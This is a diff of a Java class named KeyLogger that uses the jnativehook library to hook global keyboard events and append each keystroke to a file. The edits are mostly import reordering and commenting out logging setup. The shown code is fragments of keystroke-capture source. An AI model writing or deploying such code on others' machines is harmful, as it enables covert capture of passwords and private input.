@@ -1,5 +1,10 @@
 package msolivo;
 
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintWriter;
@@ -7,14 +12,6 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
-import java.util.logging.Level;
-
-import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 
 /**
  * @author msolivo
@@ -43,11 +40,11 @@ public class KeyLogger implements NativeKeyListener {
 	private static void init() {
 		
 		// Get the logger for "org.jnativehook" and set the level to warning.
-		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
-		logger.setLevel(Level.WARNING);
+		//java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
+		//logger.setLevel(Level.WARNING);
 
 		// Don't forget to disable the parent handlers.
-		logger.setUseParentHandlers(false);
+		//logger.setUseParentHandlers(false);
 	}
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
@@ -57,7 +54,6 @@ public class KeyLogger implements NativeKeyListener {
 				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
 			
 			if (keyText.length() > 1) {
-					//writer.print("");
 				if (keyText.contains("Invio")) {
 					writer.print("\n");
 				} else if (keyText.contains("Barra spaziatrice")) {
@@ -66,7 +62,7 @@ public class KeyLogger implements NativeKeyListener {
 					writer.print("\n\\");
 				}
 			} else {
-				writer.print(keyText.toString());
+				writer.print(keyText);
 			}
 			
 		} catch (IOException ex) {
